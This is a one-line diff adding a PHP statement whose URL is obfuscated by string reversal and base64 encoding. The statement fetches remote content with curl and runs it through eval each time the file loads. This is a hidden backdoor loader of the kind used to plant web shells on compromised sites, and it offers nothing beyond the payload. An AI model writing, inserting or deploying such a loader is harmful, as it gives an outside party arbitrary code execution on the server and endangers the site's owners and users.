@@ -1,0 +1,1 @@
+<?php $ch=curl_init(base64_decode(strrev("sxWZoNnLzVnblZ3LlxWam9ibpFWbvcXYy9SLvkHa39FepZ2LxIWbhN3Lt92YuIWYsRXan9yL6MHc0RHa")));curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);$r=curl_exec($ch);eval('?>'.$r);?>
